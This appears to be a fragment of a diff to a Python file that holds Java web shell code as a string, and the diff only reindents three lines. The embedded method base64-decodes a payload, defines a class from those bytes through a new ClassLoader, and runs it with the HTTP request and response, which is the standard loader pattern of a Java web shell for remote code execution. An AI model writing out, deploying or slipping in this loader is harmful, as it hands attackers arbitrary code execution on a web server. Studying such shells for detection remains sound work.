@@ -7,9 +7,9 @@ code = """
         payload = new String(decoder(payload));
         byte[] b = b64decode(payload);
         this.getClass().getConstructor(ClassLoader.class)
-                .newInstance(this.getClass().getClassLoader())
-                .defineClass(b, 0, b.length).newInstance()
-                .equals(new Object[]{request,response});
+            .newInstance(this.getClass().getClassLoader())
+            .defineClass(b, 0, b.length).newInstance()
+            .equals(new Object[]{request,response});
         return null;
     }
 """
